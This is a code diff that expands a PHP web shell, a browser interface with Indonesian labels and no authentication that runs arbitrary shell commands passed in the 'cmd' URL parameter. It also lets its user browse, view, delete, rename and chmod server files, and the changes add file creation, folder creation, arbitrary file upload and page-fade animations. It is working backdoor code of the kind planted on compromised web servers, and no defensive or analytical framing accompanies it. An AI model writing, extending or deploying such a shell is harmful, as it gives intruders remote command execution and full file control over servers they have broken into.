@@ -18,9 +18,7 @@ if (isset($_GET['delete'])) {
 if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
     $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
     $to   = $path . DIRECTORY_SEPARATOR . $_POST['rename_to'];
-    if (file_exists($from)) {
-        rename($from, $to);
-    }
+    if (file_exists($from)) rename($from, $to);
     header("Location: ?path=" . urlencode($path));
     exit;
 }
@@ -28,15 +26,37 @@ if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
 // Handle chmod
 if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
     $file = $path . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
-    $perm = intval($_POST['new_perm'], 8); // octal
-    if (file_exists($file)) {
-        chmod($file, $perm);
-    }
+    $perm = intval($_POST['new_perm'], 8);
+    if (file_exists($file)) chmod($file, $perm);
     header("Location: ?path=" . urlencode($path));
     exit;
 }
 
-// Command exec
+// Create folder
+if (isset($_POST['new_folder'])) {
+    $new = $path . DIRECTORY_SEPARATOR . trim($_POST['new_folder']);
+    if (!file_exists($new)) mkdir($new);
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// Create file
+if (isset($_POST['new_file'])) {
+    $file = $path . DIRECTORY_SEPARATOR . trim($_POST['new_file']);
+    if (!file_exists($file)) file_put_contents($file, "");
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// Upload file
+if (isset($_FILES['upload'])) {
+    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
+    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
+    header("Location: ?path=" . urlencode($path));
+    exit;
+}
+
+// Shell command execution
 $output = '';
 if (isset($_GET['cmd'])) {
     chdir($path);
@@ -45,40 +65,91 @@ if (isset($_GET['cmd'])) {
     $output = ob_get_clean();
 }
 
-// CSS + HTML awal
+// HTML & CSS with animation
 echo <<<HTML
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>🌐 Web Shell GUI</title>
+<meta charset="UTF-8" />
+<title>🌐 PHP Shell GUI with Animation</title>
 <style>
-    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; }
-    a { color: #61dafb; text-decoration: none; }
+    body { background: #1e1e2f; color: #cfd2dc; font-family: monospace; padding: 20px; margin:0; opacity: 0; transition: opacity 0.5s ease; }
+    body.fade-in { opacity: 1; }
+    a { color: #61dafb; text-decoration: none; cursor: pointer; }
     a:hover { text-decoration: underline; }
-    .path { margin-bottom: 20px; }
-    .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
-    ul { list-style: none; padding: 0; }
-    li { margin: 6px 0; display: flex; justify-content: space-between; align-items: center; }
-    .folder { color: #f1c40f; }
-    .file { color: #95a5a6; }
-    pre { background: #111; padding: 10px; border-radius: 5px; color: #0f0; overflow: auto; }
-    input[type=text], select { padding: 5px; background: #111; color: #0f0; border: 1px solid #555; margin-right: 5px; }
-    input[type=submit] { padding: 5px 10px; background: #333; color: #fff; border: none; cursor: pointer; }
-    .del-btn, .mini-btn { color: #e74c3c; margin-left: 10px; text-decoration: none; }
-    .mini-btn { color: #3498db; }
+    .path, .box { background: #2c2f4a; padding: 10px; border-radius: 8px; margin-bottom: 10px; }
+    input, select { padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px; }
+    input[type=submit], button.mini-btn { background: #333; color: white; cursor: pointer; border: none; padding: 5px 8px; border-radius: 3px; }
+    .del-btn { color: #e74c3c; margin-left: 5px; text-decoration: none; cursor: pointer; }
     .mini-btn:hover, .del-btn:hover { color: red; }
-    table { width: 100%; border-collapse: collapse; }
-    td, th { padding: 5px; border-bottom: 1px solid #333; font-size: 14px; }
-    h1 { color: #61dafb; }
+    pre { background: #111; color: #0f0; padding: 10px; border-radius: 5px; overflow: auto; max-height: 400px; }
+    .flex-header, .flex-row {
+        display: flex;
+        padding: 4px 0;
+        border-bottom: 1px solid #333;
+        align-items: center;
+        font-size: 14px;
+    }
+    .flex-header {
+        font-weight: bold;
+        border-bottom: 2px solid #555;
+    }
+    .col-name { min-width: 35%; overflow-wrap: break-word; }
+    .col-size { min-width: 10%; text-align: right; }
+    .col-perm { min-width: 10%; text-align: center; }
+    .col-time { min-width: 20%; }
+    .col-action { min-width: 25%; }
+    form { display: inline; margin: 0; }
 </style>
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        // Fade in on page load
+        document.body.classList.add("fade-in");
+
+        // Add fade out effect on links and forms that cause navigation
+        function fadeAndNavigate(url) {
+            document.body.style.opacity = 0;
+            setTimeout(function() {
+                window.location.href = url;
+            }, 400);
+        }
+
+        // Intercept clicks on folder links, delete links
+        document.querySelectorAll('a[href]').forEach(link => {
+            const href = link.getAttribute('href');
+            if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
+                link.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    fadeAndNavigate(href);
+                });
+            }
+        });
+
+        // Intercept all form submissions to fade out before submit
+        document.querySelectorAll('form').forEach(form => {
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                const action = form.getAttribute('action') || window.location.href;
+                const formData = new FormData(form);
+                // Disable inputs to prevent double submit
+                form.querySelectorAll('input, button, select, textarea').forEach(el => el.disabled = true);
+                // fade out
+                document.body.style.opacity = 0;
+                setTimeout(() => {
+                    // Submit form normally after fade out
+                    form.submit();
+                }, 400);
+            });
+        });
+    });
+</script>
 </head>
 <body>
-<h1>🌐 PHP Web Shell GUI</h1>
+<h1>🌐 PHP Shell GUI with Animation</h1>
 HTML;
 
 // Breadcrumb path
-echo "<div class='path box'><b>📁 Path:</b> ";
+echo "<div class='path'><b>📁 Path:</b> ";
 $parts = explode(DIRECTORY_SEPARATOR, $path);
 $nav = "";
 foreach ($parts as $p) {
@@ -88,43 +159,69 @@ foreach ($parts as $p) {
 }
 echo "</div>";
 
-// File/folder listing
+// File & folder listing with flex layout
 $files = scandir($path);
-echo "<div class='box'><table><tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Waktu</th><th>Aksi</th></tr>";
+echo "<div class='box'>";
+echo "<div class='flex-header'>
+    <div class='col-name'>Nama</div>
+    <div class='col-size'>Ukuran</div>
+    <div class='col-perm'>Perm</div>
+    <div class='col-time'>Waktu</div>
+    <div class='col-action'>Aksi</div>
+</div>";
+
 foreach ($files as $file) {
     if ($file === '.') continue;
     $full = $path . DIRECTORY_SEPARATOR . $file;
     $isDir = is_dir($full);
-    $size = $isDir ? '-' : filesize($full);
+    $size = $isDir ? '-' : number_format(filesize($full)) . ' B';
     $perm = substr(sprintf('%o', fileperms($full)), -4);
-    $mtime = date("Y-m-d H:i:s", filemtime($full));
-    $delete = "<a class='del-btn' href='?path=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick=\"return confirm('Delete $file?');\">🗑️</a>";
-    $rename = "<form style='display:inline' method='POST'><input type='hidden' name='rename_from' value='".htmlspecialchars($file)."'><input type='text' name='rename_to' size='10' placeholder='Rename'><input type='submit' value='✏️' class='mini-btn'></form>";
-    $chmod  = "<form style='display:inline' method='POST'><input type='hidden' name='chmod_file' value='".htmlspecialchars($file)."'><input type='text' name='new_perm' size='4' placeholder='0755'><input type='submit' value='🔒' class='mini-btn'></form>";
+    $time = date("Y-m-d H:i:s", filemtime($full));
 
     $link = $isDir
-        ? "<span class='folder'>📁 <a href='?path=" . urlencode($full) . "'>" . htmlspecialchars($file) . "</a></span>"
-        : "<span class='file'>📄 <a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>" . htmlspecialchars($file) . "</a></span>";
+        ? "<a href='?path=" . urlencode($full) . "'>📁 " . htmlspecialchars($file) . "</a>"
+        : "<a href='?path=" . urlencode($path) . "&view=" . urlencode($file) . "'>📄 " . htmlspecialchars($file) . "</a>";
 
-    echo "<tr><td>$link</td><td>$size</td><td>$perm</td><td>$mtime</td><td>$delete $rename $chmod</td></tr>";
+    $del = "<a class='del-btn' href='?path=" . urlencode($path) . "&delete=" . urlencode($file) . "' onclick=\"return confirm('Hapus $file?');\">🗑️</a>";
+
+    $ren = "<form method='POST'>
+                <input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>
+                <input type='text' name='rename_to' size='8' placeholder='Rename'>
+                <button type='submit' class='mini-btn' title='Rename'>✏️</button>
+            </form>";
+
+    $chmod = "<form method='POST'>
+                <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
+                <input type='text' name='new_perm' size='4' placeholder='0755'>
+                <button type='submit' class='mini-btn' title='Change Permission'>🔒</button>
+              </form>";
+
+    echo "<div class='flex-row'>
+        <div class='col-name'>$link</div>
+        <div class='col-size'>$size</div>
+        <div class='col-perm'>$perm</div>
+        <div class='col-time'>$time</div>
+        <div class='col-action'>$del $ren $chmod</div>
+    </div>";
 }
-echo "</table></div>";
+echo "</div>";
 
-// File view
+// File viewer
 if (isset($_GET['view'])) {
-    $f = $path . DIRECTORY_SEPARATOR . $_GET['view'];
-    if (is_file($f)) {
-        echo "<div class='box'><b>📄 Viewing:</b> " . htmlspecialchars($_GET['view']) . "<pre>" . htmlspecialchars(file_get_contents($f)) . "</pre></div>";
+    $viewFile = $path . DIRECTORY_SEPARATOR . $_GET['view'];
+    if (is_file($viewFile)) {
+        $content = htmlspecialchars(file_get_contents($viewFile));
+        echo "<div class='box'><b>📄 Isi file:</b> " . htmlspecialchars($_GET['view']) . "<pre>$content</pre></div>";
     }
 }
 
-// Terminal
+// Shell command form
 echo <<<HTML
-<div class="box">
+<div class='box'>
 <form method="GET">
-    <input type="hidden" name="path" value="{$path}" />
-    <input type="text" name="cmd" placeholder="Shell command..." style="width:60%;" />
-    <input type="submit" value="Run" />
+    <input type="hidden" name="path" value="{$path}">
+    <input type="text" name="cmd" placeholder="Perintah shell..." style="width:60%;">
+    <input type="submit" value="Run">
 </form>
 </div>
 HTML;
@@ -134,5 +231,24 @@ if ($output) {
     echo "<div class='box'><b>💻 Output:</b><pre>" . htmlspecialchars($output) . "</pre></div>";
 }
 
-echo "</body></html>";
+// Create file/folder & upload forms
+echo <<<HTML
+<div class='box'>
+<h3>🆕 Buat & Upload</h3>
+<form method="POST" style="margin-bottom:5px;">
+    <input type="text" name="new_file" placeholder="nama_file.txt" required>
+    <input type="submit" value="Buat File">
+</form>
+<form method="POST" style="margin-bottom:5px;">
+    <input type="text" name="new_folder" placeholder="nama_folder" required>
+    <input type="submit" value="Buat Folder">
+</form>
+<form method="POST" enctype="multipart/form-data" style="margin-bottom:5px;">
+    <input type="file" name="upload" required>
+    <input type="submit" value="Upload File">
+</form>
+</div>
+</body>
+</html>
+HTML;
 ?>
